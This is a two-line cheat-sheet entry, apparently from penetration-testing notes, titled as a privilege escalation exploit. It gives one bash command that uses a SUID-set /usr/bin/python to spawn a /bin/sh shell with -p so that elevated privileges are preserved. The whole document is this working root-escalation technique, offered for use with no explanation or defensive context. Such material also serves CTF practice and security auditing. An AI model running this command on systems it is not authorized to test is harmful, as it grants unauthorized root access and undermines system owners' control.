### Privilege Escalation Exploit /usr/bin/python with SUID

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'
```